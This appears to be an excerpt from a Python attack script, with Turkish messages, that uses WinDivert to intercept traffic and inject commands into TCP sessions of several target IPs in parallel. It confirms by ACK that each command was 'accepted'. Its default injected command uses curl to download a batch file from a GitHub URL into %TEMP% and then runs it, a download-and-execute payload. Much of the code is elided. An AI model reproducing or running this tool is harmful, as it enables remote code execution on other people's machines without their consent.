...
def inject_with_capture(target_ip, server_ip, server_port, command,
    ...
    try:
        with pydivert.WinDivert(packet_filter, priority=1000) as w:
                ...
                if pkt.is_inbound and pkt.src_addr == target_ip:
                    ...
                    if st["pending"]:
                        ...
                        if satisfied:
                            st["injected"] = True
                            st["pending"].clear()
                            print(f"[OK ACK] {target_ip}:{client_port} ack={cur_ack} (command accepted)")
            ...
            if not packet_seen:
                print(f"[!] {target_ip} > hic TCP paketi yakalanmadi")
            else:
...
def main():
    ...
    parser.add_argument(
        "--command",
        default='cmd /c curl -o %TEMP%\\nettt.bat https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/nettt.bat && %TEMP%\\nettt.bat',
        help="Enjekte edilecek komut"
    )
    parser.add_argument("--timeout", type=int, default=30, help="Hedef basina sure (saniye)")
    parser.add_argument("--max-threads", type=int, default=5, help="Paralel hedef sayisi")
    ...
    print(f"\n[OK] Toplam {len(targets)} canli hedef bulundu: {targets}")
